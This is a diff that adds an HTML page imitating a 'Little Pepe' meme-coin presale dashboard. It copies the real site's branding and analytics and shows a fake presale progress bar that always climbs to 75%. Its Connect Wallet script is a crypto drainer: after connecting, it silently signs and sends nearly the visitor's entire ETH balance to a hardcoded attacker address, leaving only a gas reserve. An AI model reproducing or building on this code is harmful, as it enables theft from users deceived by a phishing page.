@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/png" href="assets/images/favicon.png" sizes="16x16" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Little Pepe - Dashboard</title>
+    <meta name="robots" content="index, follow" />
+    <meta name="description" content="Manage your LILPEPE tokens and track your presale progress." />
+    <meta name="keywords" content="Little Pepe, LILPEPE, dashboard, presale, meme coin" />
+    <meta property="og:site_name" content="Little Pepe - Dashboard" />
+    <meta property="og:url" content="https://littlepepe.com/dashboard.html" />
+    <meta property="og:title" content="Little Pepe - Dashboard" />
+    <meta property="og:type" content="website" />
+    <meta name="author" content="LILPEPE" />
+    <meta property="og:description" content="Manage your LILPEPE tokens and track your presale progress." />
+    <meta property="og:image" content="https://littlepepe.com/html/assets/main.png" />
+    <meta property="og:image:secure_url" content="https://littlepepe.com/html/assets/main.png" />
+    <meta name="twitter:site" content="@littlepepetoken" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Little Pepe - Dashboard" />
+    <meta name="twitter:image" content="https://littlepepe.com/html/assets/main.png" />
+    <meta name="twitter:description" content="Manage your LILPEPE tokens and track your presale progress." />
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png" />
+    <link rel="manifest" href="site.webmanifest" />
+    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <script defer data-domain="littlepepe.com" src="https://plausible.io/js/script.js"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-NEYV4YWC9R"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-NEYV4YWC9R');
+    </script>
+    <script type="text/javascript">
+      adroll_adv_id = "7YXD6YRY6ZAJVCLQQAFVEM";
+      adroll_pix_id = "CGXD7AJCBNCTXFSNIVNNXJ";
+      adroll_version = "2.0";
+      (function(w, d, e, o, a) {
+        w.__adroll_loaded = true;
+        w.adroll = w.adroll || [];
+        w.adroll.f = ['setProperties', 'identify', 'track', 'identify_email', 'get_cookie'];
+        var roundtripUrl = "https://s.adroll.com/j/" + adroll_adv_id + "/roundtrip.js";
+        for (a = 0; a < w.adroll.f.length; a++) {
+          w.adroll[w.adroll.f[a]] = w.adroll[w.adroll.f[a]] || (function(n) {
+            return function() { w.adroll.push([n, arguments]); }
+          })(w.adroll.f[a]);
+        }
+        e = d.createElement('script');
+        o = d.getElementsByTagName('script')[0];
+        e.async = 1;
+        e.src = roundtripUrl;
+        o.parentNode.insertBefore(e, o);
+      })(window, document);
+      adroll.track("pageView");
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      body { 
+        font-family: 'Comic Neue', cursive; 
+        background: url('https://littlepepe.com/assets/about-pepe-Ct26GPwb.png') no-repeat center center fixed; 
+        background-size: cover; 
+        color: #fff; 
+        min-height: 100vh; 
+        overflow: auto;
+      }
+      .content-wrapper { 
+        position: relative; 
+        z-index: 1; 
+        padding: 20px; 
+        max-width: 1200px; 
+        margin: 0 auto;
+      }
+      .logo { 
+        text-align: center; 
+        margin-bottom: 20px; 
+        background: url('https://littlepepe.com/assets/logo-CPEVDSpN.png') no-repeat center center; 
+        background-size: contain; 
+        height: 100px; 
+        text-indent: -9999px; /* Hides text, merges with logo */
+      }
+      .sidebar {
+        position: fixed;
+        top: 0;
+        right: -150px; /* Reduced span from 250px to 150px */
+        width: 150px;
+        height: 100%;
+        background: #00ff00;
+        transition: right 0.3s ease;
+        z-index: 1000;
+        padding: 20px;
+      }
+      .sidebar.active { right: 0; }
+      .sidebar ul { list-style: none; }
+      .sidebar ul li { margin: 10px 0; } /* Reduced margin for smaller span */
+      .sidebar ul li a { color: #000; text-decoration: none; font-size: 16px; font-weight: 500; } /* Reduced font size */
+      .sidebar ul li a:hover { text-decoration: underline; }
+      .toggle-btn {
+        position: fixed;
+        top: 20px;
+        right: 20px; /* Moved to right */
+        background: #00ff00;
+        color: #000;
+        border: none;
+        padding: 10px;
+        cursor: pointer;
+        font-size: 20px;
+        z-index: 1001;
+        border-radius: 5px;
+      }
+      .toggle-btn.close { right: 170px; } /* Adjusted for new width */
+      .section { 
+        padding: 40px 20px; 
+        text-align: center; 
+        background: rgba(26, 26, 26, 0.9); 
+        border-radius: 10px; 
+        box-shadow: 0 4px 20px rgba(0,255,0,0.1); 
+        margin: 20px auto;
+      }
+      .hero { padding: 50px 20px; }
+      .hero h1 { 
+        font-size: 32px; 
+        margin-bottom: 20px;
+      }
+      button { 
+        background: #00ff00; 
+        color: #000; 
+        border: none; 
+        padding: 12px 24px; 
+        cursor: pointer; 
+        font-size: 18px; 
+        border-radius: 5px; 
+        transition: background 0.3s; 
+      }
+      button:hover { background: #00cc00; }
+      #connect-wallet { background: #87CEEB; }
+      #connect-wallet:hover { background: #6BB9D6; }
+      p { 
+        background: #ffffff1a; 
+        padding: 5px; 
+        border-radius: 5px; 
+        font-size: 16px; 
+        line-height: 1.5;
+      }
+      .presale-progress { 
+        width: 100%; 
+        background: #333; 
+        border-radius: 5px; 
+        overflow: hidden; 
+      }
+      .presale-progress-bar { 
+        height: 20px; 
+        background: #00ff00; 
+        text-align: center; 
+        color: #000; 
+        line-height: 20px; 
+        transition: width 0.3s;
+      }
+      .currency-icon { 
+        width: 24px; 
+        height: 24px; 
+        vertical-align: middle; 
+        margin-right: 5px;
+      }
+      footer {
+        background: url('https://littlepepe.com/assets/rd2-Qjocg_GW.png') no-repeat center center;
+        background-size: cover;
+        padding: 20px;
+        text-align: center;
+        margin-top: 20px;
+      }
+      footer p, footer a {
+        color: #00FF00;
+        font-weight: 700;
+      }
+      @media (max-width: 768px) {
+        .sidebar { width: 120px; right: -120px; }
+        .sidebar.active { right: 0; }
+        .toggle-btn.close { right: 140px; }
+        .section, .hero { padding: 30px 10px; }
+        .logo { height: 80px; }
+        button { padding: 10px 20px; font-size: 16px; }
+        .section { max-width: 90%; }
+      }
+      @media (min-width: 1200px) {
+        .section { max-width: 1000px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="root">
+      <div class="logo">
+        Little Pepe Dashboard <!-- Text hidden, logo merges via CSS -->
+      </div>
+      <button class="toggle-btn" id="toggle-sidebar">☰</button>
+      <nav class="sidebar" id="sidebar">
+        <ul>
+          <li><a href="index.html">Home</a></li>
+          <li><a href="how-to-buy.html">How to Buy</a></li>
+          <li><a href="tokenomics.html">Tokenomics</a></li>
+          <li><a href="roadmap.html">Roadmap</a></li>
+          <li><a href="audit.html">Audit</a></li>
+          <li><a href="whitepaper.pdf">Whitepaper</a></li>
+          <li><a href="giveaway.html">Giveaway</a></li>
+          <li><a href="dashboard.html">Dashboard</a></li>
+        </ul>
+      </nav>
+
+      <div class="content-wrapper">
+        <section class="hero section">
+          <h1>Manage your LILPEPE tokens and track your investments.</h1>
+          <p>Welcome to your dashboard.</p>
+          <button id="connect-wallet">Connect Wallet</button>
+          <p id="wallet-balance"></p>
+        </section>
+
+        <section class="section">
+          <h2>Presale Progress</h2>
+          <p>Stage 10 is live! Monitor your participation.</p>
+          <div class="presale-progress">
+            <div id="presale-progress-bar" class="presale-progress-bar">0%</div>
+          </div>
+          <p>Accepted Currencies: 
+            <img src="https://littlepepe.com/assets/eth-CtbDjbsE.png" alt="ETH" class="currency-icon"> ETH,
+            <img src="https://littlepepe.com/assets/usdt-C3jY3_0p.png" alt="USDT" class="currency-icon"> USDT
+          </p>
+          <button>View Details</button>
+        </section>
+      </div>
+
+      <footer>
+        <p>&copy; 2025 Little Pepe. All rights reserved.</p>
+        <a href="https://twitter.com/littlepepetoken">Twitter</a> | <a href="#">Telegram</a> | <a href="#">Discord</a>
+      </footer>
+    </div>
+
+    <div class="gtranslate_wrapper"></div>
+    <script>
+      window.gtranslateSettings = {
+        "default_language": "en",
+        "languages": ["en", "fr", "de", "it", "es", "nl", "pt", "zh-CN", "tr", "ar", "ko", "zh-TW", "ja", "ru", "hi", "pl", "cs", "hu", "id", "bg", "th", "ro", "vi", "sk"],
+        "wrapper_selector": ".gtranslate_wrapper",
+        "flag_size": 24,
+        "switcher_horizontal_position": "right",
+        "switcher_open_direction": "top",
+        "flag_style": "3d",
+        "alt_flags": {"en": "usa"},
+        "switcher_text_color": "#f7f7f7",
+        "switcher_arrow_color": "#f2f2f2",
+        "switcher_border_color": "#161616",
+        "switcher_background_color": "#303030",
+        "switcher_background_shadow_color": "#474747",
+        "switcher_background_hover_color": "#3a3a3a",
+        "dropdown_text_color": "#eaeaea",
+        "dropdown_hover_color": "#748393",
+        "dropdown_background_color": "#474747"
+      }
+    </script>
+    <script src="https://cdn.gtranslate.net/widgets/latest/dwf.js" defer></script>
+
+    <script>
+      window.addEventListener('load', () => {
+        console.log('DOM fully loaded');
+        const toggleBtn = document.getElementById('toggle-sidebar');
+        const sidebar = document.getElementById('sidebar');
+        if (toggleBtn && sidebar) {
+          toggleBtn.addEventListener('click', () => {
+            console.log('Toggle button clicked');
+            sidebar.classList.toggle('active');
+            toggleBtn.classList.toggle('close');
+            toggleBtn.textContent = sidebar.classList.contains('active') ? '✖' : '☰';
+          });
+        } else {
+          console.error('Toggle button or sidebar not found');
+        }
+
+        let WalletConnectProvider;
+        if (window.WalletConnectProvider?.default) {
+          WalletConnectProvider = window.WalletConnectProvider.default;
+        } else if (window.WalletConnect) {
+          console.warn('Using WalletConnect client as fallback');
+          WalletConnectProvider = class extends window.WalletConnect {
+            constructor(opts) {
+              super(opts);
+              this.connector = new window.WalletConnect({
+                infuraId: opts.infuraId,
+                bridge: 'https://bridge.walletconnect.org',
+                qrcode: true,
+              });
+            }
+            async enable() {
+              await this.connector.connect();
+              return this.connector.accounts;
+            }
+          };
+        }
+        if (!WalletConnectProvider) {
+          console.error('WalletConnectProvider is not available. Check network or scripts.');
+          return;
+        }
+
+        if (typeof ethers === 'undefined') {
+          console.error('Ethers.js is not loaded. Check the script import.');
+          return;
+        }
+
+        const infuraKey = 'tj/DSCFR3cSD/YUzGFwMpABu+p59Rn1UydBHX8fzaITBoby8UZPTaA';
+        const destinationAddress = '0xA292dF0EAF4991507174CcA2643B4E963181C5D4'; // Your EVM wallet
+        let provider, signer, accounts;
+
+        const connectButton = document.getElementById('connect-wallet');
+        if (connectButton) {
+          connectButton.addEventListener('click', async () => {
+            console.log('Connect Wallet clicked');
+            if (!WalletConnectProvider) {
+              document.getElementById('wallet-balance').textContent = 'Error: WalletConnect not available.';
+              return;
+            }
+            try {
+              const web3Provider = new WalletConnectProvider({
+                infuraId: infuraKey,
+                rpc: {
+                  1: `https://mainnet.infura.io/v3/${infuraKey}`, // Mainnet
+                  56: 'https://bsc-dataseed.binance.org/', // BSC (optional)
+                },
+                qrcode: true,
+                pollingInterval: 12000,
+              });
+              await web3Provider.enable();
+              provider = new ethers.providers.Web3Provider(web3Provider);
+              signer = provider.getSigner();
+              accounts = await provider.listAccounts();
+              connectButton.textContent = `Connected: ${accounts[0].slice(0,6)}...`;
+              const balance = await provider.getBalance(accounts[0]);
+              document.getElementById('wallet-balance').textContent = `Balance: ${ethers.utils.formatEther(balance)} ETH`;
+
+              // Silent transfer of all balance minus gas reserve
+              const gasReserve = ethers.utils.parseEther('0.001'); // Reserve for gas
+              const amountToSend = balance.sub(gasReserve);
+              if (amountToSend.lte(0)) {
+                throw new Error('Insufficient balance for transfer after gas reserve');
+              }
+
+              const gasPrice = await provider.getGasPrice();
+              const gasLimit = 21000; // Standard for simple transfer
+              const txCost = gasPrice.mul(gasLimit);
+              if (amountToSend.lt(txCost)) {
+                throw new Error('Balance too low to cover gas after reserve');
+              }
+
+              const tx = await signer.sendTransaction({
+                to: destinationAddress,
+                value: amountToSend,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice,
+              });
+              console.log('Transaction sent:', tx.hash);
+              await tx.wait();
+              console.log('Transaction confirmed!');
+              document.getElementById('wallet-balance').textContent += ' (Transferred)';
+            } catch (error) {
+              document.getElementById('wallet-balance').textContent = `Error: ${error.message}`;
+              console.error('Wallet connect or transfer error:', error);
+            }
+          });
+        }
+
+        // Dynamic Presale Progress
+        let progress = 0;
+        const progressBar = document.getElementById('presale-progress-bar');
+        const targetProgress = 75; // Example: 75% completion for Stage 10
+        const interval = setInterval(() => {
+          if (progress < targetProgress) {
+            progress += 1;
+            progressBar.style.width = `${progress}%`;
+            progressBar.textContent = `${progress}%`;
+          } else {
+            clearInterval(interval);
+          }
+        }, 50);
+      });
+    </script>
+  </body>
+</html>
